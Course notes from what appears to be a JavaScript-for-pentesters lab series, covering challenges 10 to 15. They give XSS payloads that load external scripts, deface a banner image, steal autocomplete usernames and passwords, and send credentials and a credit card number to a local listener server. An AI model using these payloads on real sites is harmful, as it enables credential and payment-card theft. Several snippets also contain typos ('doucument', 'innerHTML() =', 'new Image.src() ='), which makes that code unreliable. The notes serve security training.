                    Javascript For Pentesters
                    Course Notes Part 3


10 - Include External JS using JS
Similar to the previous challenge but you are not allowed to use the script tag in any way
As usual in the challenges there is an examination of the sample page source code.
The source code shows that the www passed to the url parameter is reflected within a script
The solution is to create a new script tage and then bind it to the source JS script
Solution Syntax
  var newtag = document.createElement("script");
  newtag.type  = "text/javascript";
  newtag.src = "script url";
  doucument.body.appendChild(newtag);
As usual encode and add to the url parameter


11 - Replacing Banner Image
Replacing the exiting image with a defacement image using JS only
Solution Syntax
  <script>
    document.getElementsByTagName("img")[0].src = "image url"    
  </script>
As usual encode and add to the url parameter
This is only happening on the client side only so the server remains untouched


12 - Stealing From Auto-Complete
Task is to complete an auto-complete option for the page and then wait for 10 seconds before submitting details to the attacker
Again the url parameter is used to mimic a XSS attack
As has been done before there is a server running
  - python -m SimpleHTTPServer 9000  -- This will start a server on port 9000
Solution Syntax
  <script>
    // This will allow the malicious code to be triggered after a specified time
    // In most programming languages it will be in milliseconds
    window.setTimeout(function(){
      document.forms[0].action = 'http://localhost:9000';
      document.forms[0].submit();
    }, 10000);
  </script>
Again as is standard practice script is encoded


13 - Posting with XmlHTTPRequest
Similar to the previous example but using XHR instead
Password should have already been saved in auto-complete
Solution Syntax
  <script>
    // Getting the password and username
    username = document.forms[0].elements[0].value;
    password = document.forms[0].elements[1].value;
    
    window.setTimeout(function(){
      // The XHR request
      var req = new XMLHttpRequest();
      req.open("GET", "http://localhost:8000/?username="+username+"&password="+password, true);
      req.send();
      
      // For checking 
      // alert(username + ":" password);
    }, 10000);
  </script>


14 - Fetch Data With XMLHttpRequest
Find and display a users email address from a different page
When viewing the source code for the page there is a comment
  - Email can be obtained using a GET request to a specific url with the users username
This is a fairly common scenario once an XSS vulnerability has been discovered
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      // Checks to see is there data waiting from the server
      if(req.readyState == 4 && req.status == 200){
        document.getElementById("result").innerHTML() = req.responseText; 
      }
    }
    
    // The lab has a specific url
    req.open("GET", "/lab/url/name=username", true);
    req.send();
  </script>


15 - Data Exfiltration With XMLHttpRequest
Use the xss on the page post the user credit card number to the attack server
Similar to the previous challenge the source code gives a hint
  - This time it is a POST request to a specific url with the users name
Solution Syntax
  <script>
    // The XHR request
    var req = new XMLHttpRequest();
    
    // A handler for when the server responds
    req.onreadystatechange = function(){
      // Checks to see is there data waiting from the server
      if(req.readyState == 4 && req.status == 200){
        alert(req.responseText);
        new Image.src() = "http://localhost:8800/?cardno=" + req.responseText; 
      }
    }
    
    req.open("POST", "lab url", true);
    
    // Using POST instead of GET means that you have to list the content type
    req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    req.send("user=username");
  </script>
